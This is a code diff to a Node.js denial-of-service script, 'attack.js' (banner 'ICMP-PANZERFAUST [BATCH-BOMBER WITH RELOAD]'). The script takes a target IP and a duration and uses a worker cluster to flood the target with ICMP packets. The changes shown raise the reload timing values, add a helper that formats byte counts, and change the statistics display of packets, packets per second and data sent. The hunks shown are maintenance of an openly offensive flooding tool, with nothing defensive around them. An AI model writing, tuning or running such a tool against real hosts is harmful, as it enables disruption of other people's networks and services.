@@ -6,8 +6,8 @@ const { exec } = require('child_process');
 const target = process.argv[2];
 const duration = parseInt(process.argv[3]);
 const batchSize = 10;
-const reloadMin = 23;
-const reloadMax = 25;
+const reloadMin = 2300;
+const reloadMax = 2500;
 
 if (!target || isNaN(duration)) {
   console.log('Usage: node attack.js <target_ip> <duration_seconds>');
@@ -20,6 +20,16 @@ const endTime = Date.now() + duration * 1000;
 if (cluster.isMaster) {
   let stats = { sent: 0, success: 0, failed: 0, maxpps: 0, bytesSent: 0 };
   let lastLatency = 'N/A';
+
+  function formatBytes(bytes) {
+    const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB'];
+    let i = 0;
+    while (bytes >= 1024 && i < units.length - 1) {
+      bytes /= 1024;
+      i++;
+    }
+    return `${bytes.toFixed(2)} ${units[i]}`;
+  }
 
   console.clear();
   console.log('ICMP-PANZERFAUST [BATCH-BOMBER WITH RELOAD]');
@@ -53,7 +63,7 @@ if (cluster.isMaster) {
     console.log(`Failed: ${stats.failed}`);
     console.log(`Max PPS: ${stats.maxpps}`);
     console.log(`Total Sent Packets: ${stats.sent}`);
-    console.log(`Total Bytes Sent: ${(stats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
+    console.log(`Total Data Sent: ${formatBytes(stats.bytesSent)}`);
     console.log(`Target Latency: ${lastLatency} ms`);
     console.log('--------------------------------------');
     stats.maxpps = 0;
